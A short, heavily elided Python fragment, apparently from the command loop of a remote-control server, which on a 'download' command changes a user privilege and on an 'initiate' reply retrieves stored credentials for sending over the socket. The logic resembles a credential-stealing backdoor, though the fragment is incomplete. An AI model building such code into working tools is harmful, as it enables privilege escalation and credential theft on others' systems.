        ...
        while True:
            ...
            if len(data_received) > 0:
                if data_received == 'download':
                    ...
                    if result == 0:
                        connection.send(b'change_user_privilege_successful')
                    ...
                    client_reply = connection.recv(255).decode()

                    if client_reply == "initiate":
                        result = str(self.get_credentials()).encode()
